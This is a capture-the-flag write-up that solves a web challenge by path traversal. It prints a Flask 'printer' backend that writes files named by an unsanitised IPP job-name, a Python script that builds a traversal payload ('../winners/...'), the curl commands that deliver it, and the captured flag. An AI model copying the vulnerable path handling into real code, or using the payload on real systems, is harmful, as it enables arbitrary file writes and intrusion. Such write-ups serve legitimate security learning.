---
layout: writeup
title: Who checks the integrity of the integrity checks?
tags: WebX
---

## Description

The government has ordered verification of the votes via the printed receipts. The results were... a mismatch in votes! While there were probably multiple ways that this came as a result, is it possible for someone to tamper with the receipts?

As the backend code for all of week 4 was the same, we also had the backend code of the printer


## Solution

Here is the backend code of the printers:

```python
from flask import Flask, request, send_file, abort, Response
import os
import struct

app = Flask(__name__)

FLAG_PATH = "/flag.txt"
PRINTJOB_FOLDER = "/tmp/printjobs"
CHAL_TARGET_FOLDER = "/tmp/winners"

@app.route('/printers/votes', methods=['POST'])
def handle_print_job():
    data = request.data
    idx = 8
    if data[idx] != 0x01:
        return "Missing operation attributes tag", 400
    idx += 1

    filename = None
    try:
        while data[idx] != 0x03:
            tag = data[idx]
            name_len = struct.unpack(">H", data[idx+1:idx+3])[0]
            name = data[idx+3:idx+3+name_len].decode()
            val_len_offset = idx+3+name_len
            val_len = struct.unpack(">H", data[val_len_offset:val_len_offset+2])[0]
            val = data[val_len_offset+2:val_len_offset+2+val_len].decode()
            if name == "job-name":
                filename = val
            idx = val_len_offset + 2 + val_len
    except Exception:
        return "Malformed IPP attributes", 400

    idx += 1  # skip end tag
    pdf_data = data[idx:]

    if not filename:
        return "job-name attribute is required", 400

    with open(f"{PRINTJOB_FOLDER}/{filename}", "wb") as f:
        f.write(pdf_data)

    actual_path = os.path.realpath(os.path.join(PRINTJOB_FOLDER, filename))

    if actual_path.startswith(CHAL_TARGET_FOLDER):
        with open(FLAG_PATH, "r") as f:
            flag = f.read()

        with open(actual_path, "w") as f:
            f.write(flag)

    return Response("Print job saved", status=200, content_type="application/ipp")

@app.route("/files/<path:filename>")
def get_flag(filename):
    safe_path = os.path.realpath(os.path.join(CHAL_TARGET_FOLDER, filename))

    if not safe_path.startswith(os.path.realpath(CHAL_TARGET_FOLDER)):
        abort(403, description="Access denied")

    if not os.path.isfile(safe_path):
        abort(404, description="File not found")

    return send_file(safe_path)

@app.after_request
def add_printer_headers(response):
    response.headers["Server"] = "CUPS/2.3 IPP/2.0"
    return response

if __name__ == "__main__":
    os.makedirs(CHAL_TARGET_FOLDER, exist_ok=True)
    os.makedirs(PRINTJOB_FOLDER, exist_ok=True)
    app.run(host="0.0.0.0", port=631)
```

Now as this program ran on a different domain then all the other challenges, the first step was to figure out what domain the server was being run on. Now as I knew that the server for the mobile app was hosted at `http://mobile-app.commission.freedonia.vote` I figures, that it would probably be a very simmilar subdomain to this, so I tried `http://printer.commission.freedonia.vote` and what would you know it:

```bash
$ dig +short printer.commission.freedonia.vote
re.da.ct.ed
```

That has a IPv4 result in the DNS records. So, now knowing that the server was hosted at `http://printer.commission.freedonia.vote` its time to exploit.

Reading the code over we seem to need to input a value into `handle_print_job` that does directory traversal from `/tmp/printjobs/` into `/tmp/winners/` and then with `get_flag` we seem to be able to read any file within `/tmp/winners/` but can't do path traversal out of there.

The only hard part about this challenge is the complex `.ipp` file stuff that we appear to need to deal with. So after figuring out how `.ipp` files work, I came up with this python file which generates the `.ipp` file for me.

```python
import struct

fake_pdf = b"%PDF-1.7\n%...\n"

payload = b""

# They don't care about the first 8 bytes
payload += b"\x01" * 8 

# Operation Attributes Tag that needs to be \0x01 for some reason
payload += b"\x01"

# vars
header_name = b"job-name"
value = b"../winners/flaginsECUre123456.txt"

payload += b"\x00" # tag, not used
payload += struct.pack('>H', len(header_name)) # name_len
payload += header_name # name
payload += struct.pack('>H', len(value)) # val_len
payload += value # val

payload += b"\x03" # Ending character

payload += fake_pdf

with open("ipp_request.bin", "wb") as f:
	f.write(payload)
```

running this then writes a new `ipp_request.bin` file that contains the payload to submit. I called the file flaginsECUre123456.txt becuas ewe were told in the discord server not to call it guessable names so other teams can't just read our file but need to actually do the whole thing themselves, also becuase my team name was insECUre. I then submitted the payload

```bash
$ curl -X POST "http://printer.commission.freedonia.vote/printers/votes" --data-binary @ipp_request.bin -H "Content-Type: application/ipp"
Print job saved
```

 then read the file with /files

```bash
$ curl "http://printer.commission.freedonia.vote/files/flaginsECUre123456.txt"
cysea{cant_trust_anything_these_days_31fe6ba0a0}
```

 And there is our flag `cysea{cant_trust_anything_these_days_31fe6ba0a0}`
